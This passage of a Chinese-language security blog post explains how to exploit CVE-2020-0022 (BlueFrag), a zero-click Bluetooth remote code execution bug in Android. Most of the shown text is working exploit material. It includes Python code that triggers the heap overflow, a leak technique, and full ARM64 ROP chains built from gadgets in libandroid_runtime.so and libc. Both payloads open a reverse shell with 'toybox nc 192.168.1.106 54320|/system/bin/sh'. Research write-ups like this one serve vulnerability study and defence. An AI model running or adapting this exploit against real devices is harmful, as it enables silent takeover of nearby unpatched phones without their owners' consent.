C_h, [dst, 48]</span><br><span class="line">	ldp	C_l, C_h, [src, 48]</span><br><span class="line">	stp	D_l, D_h, [dst, 64]!</span><br><span class="line">	ldp	D_l, D_h, [src, 64]!</span><br><span class="line">	subs	count, count, 64</span><br><span class="line">	b.hi	1b</span><br><span class="line">	/* Write the last full set of 64 bytes.	 The remainder is at most 64</span><br><span class="line">	   bytes, so it is safe to always copy 64 bytes from the end even if</span><br><span class="line">	   there is just 1 byte left.  */</span><br><span class="line">2:  &lt;-- 处理不足 64 字节的情况，从尾部往前拷贝 64 字节。</span><br><span class="line">	ldp	E_l, E_h, [srcend, -64]</span><br><span class="line">	stp	A_l, A_h, [dst, 16]</span><br><span class="line">	ldp	A_l, A_h, [srcend, -48]</span><br><span class="line">	stp	B_l, B_h, [dst, 32]</span><br><span class="line">	ldp	B_l, B_h, [srcend, -32]</span><br><span class="line">	stp	C_l, C_h, [dst, 48]</span><br><span class="line">	ldp	C_l, C_h, [srcend, -16]</span><br><span class="line">	stp	D_l, D_h, [dst, 64]</span><br><span class="line">	stp	E_l, E_h, [dstend, -64]</span><br><span class="line">	stp	A_l, A_h, [dstend, -48]</span><br><span class="line">	stp	B_l, B_h, [dstend, -32]</span><br><span class="line">	stp	C_l, C_h, [dstend, -16]</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
+<p>假设 <code>count == -2</code>，拷贝逻辑就很有意思了：</p>
+<ol>
+<li>srcend 和 dstend 分别指向 src、dst 的倒数第 3 个字节。</li>
+<li>count &gt; 96，进入 copy_long。</li>
+<li>count = count + tmp1，count -&gt; [-2: 12]，大概率是一个正数。</li>
+<li>从 src 拷贝 16 字节到 dst，并对齐 dst 到 16 字节。</li>
+<li>count &lt; 128 + 16，从 srcend - 64 拷贝 64 字节到 dstend - 64，从 src + 16 拷贝 64 字节到 dst + 16。</li>
+</ol>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/b546fa4bf8166b4dd21fde867828d2d57e51ed42" alt=""></p>
+<p>由此堆溢出可以转为内存读写，有以下几点：</p>
+<ol>
+<li>重组包和续包的大小都是可控的， slab 分配器分配相同大小的对象是内存相邻的。</li>
+<li>如果 L2CAP Echo Request 前序包的 len(Data) &gt;= 66 字节，就不会覆盖到重组包的任何头部结构。这是最简单的一种泄漏方式，每次可以泄漏 64 - 16（续包头部）= 48 bytes 的内存。</li>
+<li>如果 len(Data) &lt; 66 字节，会用续包之前的内存破坏重组包的头部， 可能收不到 Echo 的返回包。可以考虑堆喷相同大小的续包，使得续包之前的内存可控，这样能可靠的修改重组包的头部，通过 Echo Response 进行高级内存泄漏。</li>
+<li>重组包后面的内存可能是空闲的，也可能分配了对象，但是不包含指针等，因此不能稳定 crash。</li>
+</ol>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/e41a5fe61cff3b40104edea3dd60bdb5e6020cc3" alt=""></p>
+<p>利用 memcpy 向后拷贝 64+ 字节，触发 crash 的代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload_base = <span class="number">0x41424344454647</span></span><br><span class="line">overflow = [payload_base]*<span class="number">200</span></span><br><span class="line"></span><br><span class="line">overflow = [payload_base]*<span class="number">200</span></span><br><span class="line">overflow = <span class="string">"A"</span> + struct.pack(<span class="string">"Q"</span>*len(overflow), *overflow)</span><br><span class="line">ident = <span class="number">0</span></span><br><span class="line">tries = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> xrange(tries):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Overflow signal object (%d/%d)"</span> % (t, tries)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">20</span>):</span><br><span class="line">        send_echo_hci(ident+<span class="number">1</span>, <span class="string">"A"</span>*<span class="number">3</span>, l2cap_len_adj=<span class="number">2</span>)</span><br><span class="line">        send_echo_hci(ident+<span class="number">2</span>, overflow[:<span class="number">70</span>], continuation_flags=<span class="number">1</span>)</span><br><span class="line">        ident = (ident+<span class="number">1</span>) % <span class="number">250</span></span><br></pre></td></tr></table></figure>
+<p>可用 crash 现场：</p>
+<ul>
+<li>00 pc 00000000000ca258  /system/lib64/libchrome.so (base::WaitableEvent::Signal()+204)， X0 可控，PC 可控。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /system/lib64/libchrome.so</span><br><span class="line">.text:00000000000CA258                 LDR             X8, [X0]</span><br><span class="line">.text:00000000000CA25C                 LDR             X8, [X8]</span><br><span class="line">.text:00000000000CA260                 BLR             X8</span><br></pre></td></tr></table></figure>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/116368779bcd62afb1a238b481de2ca6ad35116e" alt=""></p>
+<p>接下来只要能泄漏 lib 库的地址，以及一块已知地址的可写内存，就可以 rce。采用上面说的高级内存泄漏的方式，堆喷和续包同样大小的包。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/75b887a23729d1faf13d49d74aeadf2ec51ceba1" alt=""></p>
+<p>触发漏洞，可控的修改重组包的头部，泄漏的堆内存位于 Echo Response 中，从泄漏内存中找可用的指针，进而推测 –&gt; lib 库基地址。<br>在泄漏的过程中蓝牙进程可能会奔溃重启，幸运的是 lib 库的地址每次系统重启才会改变。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4028a27059348deb34ce13041ce46af81a0771a5" alt=""></p>
+<p>通过控制续包所在的内存，泄漏 partial_packets，进而获得重组包的地址 –&gt; 可控内存。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static std::unordered_map&lt;uint16_t /* handle */, BT_HDR*&gt; partial_packets;</span><br></pre></td></tr></table></figure>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/703da9b72ba42612b8015cb0600d4e57df0f6412" alt=""></p>
+<p>原作者用的三星，可以泄漏 <code>libicuuc.so</code> 的地址，这个库里里面有 dlopen 和 dlsym，可以构造 rop 解析 system 的符号。在 nexus 6p 测试，只能稳定泄漏 <code>libandroid_runtime.so</code>、<code>libutils.so</code> 的地址。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/e24b5d78a1216c8c76dd880d8ddf269f3530504b" alt=""></p>
+<p><code>libandroid_runtime.so</code> 中有 fork 和 execv 的符号，可以构造以下 rop。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"># 蓝牙进程不可用后系统会发送 SYSKILL 信号，父进程和子进程都会被 kill</span><br><span class="line"># 如果子进程比父进程执行的快，就可以正常反连。</span><br><span class="line"># 有兴趣的可以完善该 ROP，根据 fork 的返回值让父进程陷入死循环，子进程正常 execv。</span><br><span class="line"># 能用就行吧，写不动了 :)</span><br><span class="line"># libandroid_runtime.so gadget</span><br><span class="line"># initial x0 ** = gadget 1</span><br><span class="line"># 0x00000000000fd764 : mov x19, x0 ; ldp x20, x21, [x19, #8] ; cmp x20, x21 ; b.eq #0xfd838 ; ldp x1, x0, [x20], #0x10 ; ldr x8, [x0] ; ldr x8, [x8, #0x10] ; blr x8</span><br><span class="line"># 0x000000000012d49c : mov x1, x19 ; ldr x8, [x0] ; ldr x8, [x8, #0xb0] ; blr x8 ; ldr x0, [x21] ; ldr x8, [x0] ; ldr x8, [x8, #0x28] ; blr x8</span><br><span class="line"># 0x00000000001957d4 : ldp x2, x1, [x0, #8] ; br x2</span><br><span class="line"># 0x000000000012e74c : ldr x0, [x0, #0x68] ; sxtw x2, w2 ; ldr x8, [x0] ; ldr x8, [x8, #0x10] ; blr x8</span><br><span class="line"># 0x00000000000e7b50 : ldr x0, [x1] ; ldr x8, [x0] ; ldr x2, [x8, #0x18] ; br x2</span><br><span class="line"># 0x000000000019b148 : ldp x2, x1, [x0, #-0x10] ; mov x0, x8 ; br x2</span><br><span class="line"></span><br><span class="line">execv_plt = libandroid_runtime_base + 0x9fdb0 - 0x33000</span><br><span class="line">fork_plt = libandroid_runtime_base + 0x9fd20 - 0x33000</span><br><span class="line">gadget1_addr = libandroid_runtime_base + 0xfd764 - 0x33000</span><br><span class="line">gadget2_addr = libandroid_runtime_base + 0x12d49c - 0x33000</span><br><span class="line">gadget3_addr = libandroid_runtime_base + 0x1957d4 - 0x33000</span><br><span class="line">gadget4_addr = libandroid_runtime_base + 0x12e74c - 0x33000</span><br><span class="line">gadget5_addr = libandroid_runtime_base + 0xe7b50 - 0x33000</span><br><span class="line">gadget6_addr = libandroid_runtime_base + 0x19b148 - 0x33000</span><br><span class="line">test = 0x41424344454647</span><br><span class="line"></span><br><span class="line">pc_offset = 80</span><br><span class="line">new_payload_offset = 240</span><br><span class="line">new_payload_base = payload_base + new_payload_offset</span><br><span class="line">execv_x0 = new_payload_base + 200 + 8</span><br><span class="line">execv_x1 = new_payload_base + 56</span><br><span class="line"></span><br><span class="line">set_ptr(payload_ptr, 0, payload_base + pc_offset)</span><br><span class="line">set_ptr(payload_ptr, pc_offset, gadget1_addr)</span><br><span class="line"></span><br><span class="line"># gadget 1</span><br><span class="line"># 0x00000000000fd764 : mov x19, x0 ; ldp x20, x21, [x19, #8] ; cmp x20, x21 ; b.eq #0xfd838 ; ldp x1, x0, [x20], #0x10 ; ldr x8, [x0] ; ldr x8, [x8, #0x10] ; blr x8</span><br><span class="line">set_ptr(payload_ptr, 8, payload_base + 24)  # x20</span><br><span class="line">set_ptr(payload_ptr, 16, payload_base + 64)  # x21</span><br><span class="line">set_ptr(payload_ptr, 24, 0)  # x1, useless</span><br><span class="line">set_ptr(payload_ptr, 32,  payload_base + 48)  # x0 -&gt; 48</span><br><span class="line">set_ptr(payload_ptr, 48, payload_base + 56 - 0x10)  # x8 -&gt; 40</span><br><span class="line">set_ptr(payload_ptr, 56, gadget2_addr)  # x8</span><br><span class="line"></span><br><span class="line"># gadget 2</span><br><span class="line"># 0x000000000012d49c : mov x1, x19 ; ldr x8, [x0] ; ldr x8, [x8, #0xb0] ; blr x8 ; ldr x0, [x21] ; ldr x8, [x0] ; ldr x8, [x8, #0x28] ; blr x8</span><br><span class="line">set_ptr(payload_ptr, 40 + 0xb0, fork_plt)  # x8</span><br><span class="line">set_ptr(payload_ptr, 64, payload_base + new_payload_offset)  # new x0 -&gt; 240</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset, payload_base + 72 - 0x28)  # x8</span><br><span class="line">set_ptr(payload_ptr, 72, gadget3_addr)  # new x0 -&gt; 320</span><br><span class="line"></span><br><span class="line"># gadget 3</span><br><span class="line"># 0x00000000001957d4 : ldp x2, x1, [x0, #8] ; br x2</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 8, gadget4_addr)  # x2</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 16, new_payload_base + 24)  # x1</span><br><span class="line"></span><br><span class="line"># gadget 4</span><br><span class="line"># 0x000000000012e74c : ldr x0, [x0, #0x68] ; sxtw x2, w2 ; ldr x8, [x0] ; ldr x8, [x8, #0x10] ; blr x8</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 0x68, new_payload_base + 200)  # new x0</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 200, new_payload_base + 32)  # x8</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 32 + 0x10, gadget5_addr)  # new x8</span><br><span class="line"></span><br><span class="line"># gadget 5</span><br><span class="line"># 0x00000000000e7b50 : ldr x0, [x1] ; ldr x8, [x0] ; ldr x2, [x8, #0x18] ; br x2</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 24, new_payload_base + 128)  # new x0</span><br><span class="line"># [execv_x0 + 0x18] = gadget6_addr</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 128,  execv_x0)  # x8</span><br><span class="line"></span><br><span class="line"># gadget 6</span><br><span class="line"># 0x000000000019b148 : ldp x2, x1, [x0, #-0x10] ; mov x0, x8 ; br x2</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 128 - 0x10, execv_plt)</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 128 - 0x10 + 8, execv_x1)</span><br><span class="line"></span><br><span class="line"># argv[]</span><br><span class="line">argv_base = execv_x0 + 32</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 56, argv_base)</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 64, argv_base+8)</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 72, argv_base+16)</span><br><span class="line">set_ptr(payload_ptr, new_payload_offset + 80, 0)</span><br><span class="line">for i in xrange(len(payload_ptr)):</span><br><span class="line">    if not payload_ptr[i]:</span><br><span class="line">        # payload_ptr[i] = 0xdead0000 + i</span><br><span class="line">        payload_ptr[i] = 0</span><br><span class="line"></span><br><span class="line">payload = &quot;AAAA&quot; + struct.pack(&quot;Q&quot;*len(payload_ptr), *payload_ptr)</span><br><span class="line">payload += &apos;/system/bin/sh\x00\x00&apos; + &apos;\x00&apos; * 8 + struct.pack(&apos;Q&apos;, gadget6_addr)</span><br><span class="line">payload += &apos;sh&apos; + &apos;\x00&apos; * 6 + &apos;-c&apos; + &apos;\x00&apos; * 6 + &apos;toybox nc 192.168.1.106 54320|/system/bin/sh &amp;\x00&apos;</span><br><span class="line">payload += &quot;Z&quot;*(payload_len - len(payload))</span><br></pre></td></tr></table></figure>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4b7fed4c0b94715f153016978840187a421f3cee" alt=""></p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4f517f0d8d114ee7e53cd26eea7b513525569813" alt=""></p>
+<p>还有一种思路是构造 rop 读取 <code>libandroid_runtime.so</code> 的 got 表，添加偏移定位到 system。</p>
+<p>也可以结合其他信息泄漏漏洞获取 system 的符号，这样 rop 简单很多 :)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 假设已知 libc.so 基地址</span><br><span class="line">pc_offset = 0x30</span><br><span class="line"></span><br><span class="line">system_libc = libc_base + 0x65e10</span><br><span class="line"># 0x0000000000067df8 : ldp x1, x8, [x0, #8] ; mov x0, x8 ; br x1</span><br><span class="line">gadget_libc = libc_base + 0x67df8</span><br><span class="line">set_ptr( payload_ptr, 0, payload_base + pc_offset)                      # initial x0 ** = gadget 1</span><br><span class="line">set_ptr( payload_ptr, pc_offset, gadget_libc)</span><br><span class="line">set_ptr( payload_ptr, 0x8, system_libc)</span><br><span class="line">set_ptr( payload_ptr, 0x8+0x8, payload_base+0x38)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in xrange(len(payload_ptr)):</span><br><span class="line">    if not payload_ptr[i]:</span><br><span class="line">        payload_ptr[i] = 0xdead0000 + i</span><br><span class="line">        </span><br><span class="line">payload = &quot;AAAA&quot; + struct.pack(&quot;Q&quot;*len(payload_ptr), *payload_ptr)</span><br><span class="line">payload += &apos;toybox nc 192.168.1.106 54320 | /system/bin/sh;\x00&apos;</span><br><span class="line">payload += &quot;Z&quot;*(payload_len - len(payload))</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>基本都是原作的东西，简单做个总结，感谢分享 ～</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://paper.seebug.org/1121/" target="_blank" rel="noopener">https://paper.seebug.org/1121/</a></p>
+<p><a href="https://android.googlesource.com/platform/system/bt/" target="_blank" rel="noopener">https://android.googlesource.com/platform/system/bt/</a></p>
+<p><a href="https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/" target="_blank" rel="noopener">https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/</a></p>
+<p><a href="https://android.googlesource.com/platform/bionic/+/refs/heads/master/libc/arch-arm64/generic/bionic/memcpy_base.S" target="_blank" rel="noopener">https://android.googlesource.com/platform/bionic/+/refs/heads/master/libc/arch-arm64/generic/bionic/memcpy_base.S</a></p>
+<p><a href="https://stackoverflow.com/questions/28445552/bluetooth-hci-snoop-log-not-generated" target="_blank" rel="noopener">https://stackoverflow.com/questions/28445552/bluetooth-hci-snoop-log-not-generated</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+
+
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 fenix 的个人博客">fenix</a>
+        </li>
+
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="https://0x43434343.com/2020/05/06/202004281121/" title=""></a>
+        </li>
+
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="https://0x43434343.com/2020/05/06/202004281121/" title="">https://0x43434343.com/2020/05/06/202004281121/</a>
+        </li>
+
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2020年5月6日 - 15时05分
+        </li>  
+
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 fenix 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> </br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/29/201910291700/" rel="next" title="Girl CTF Course Project 1 Write-up">
+                <i class="fa fa-chevron-left"></i> Girl CTF Course Project 1 Write-up
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="fenix" />
+            
+              <p class="site-author-name" itemprop="name">fenix</p>
+              <p class="site-description motion-element" itemprop="description">愿得一人心，白首不分离。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/fenixns" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:abcnsxyz@gmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#c"><span class="nav-number">1.</span> <span class="nav-text">c</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number"></span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#准备工作"><span class="nav-number"></span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用"><span class="nav-number"></span> <span class="nav-text">利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number"></span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number"></span> <span class="nav-text">参考</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">fenix</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">83.9k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://0x43434343.com/2020/05/06/202004281121/';
+          this.page.identifier = '2020/05/06/202004281121/';
+          this.page.title = '';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://fenixns.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
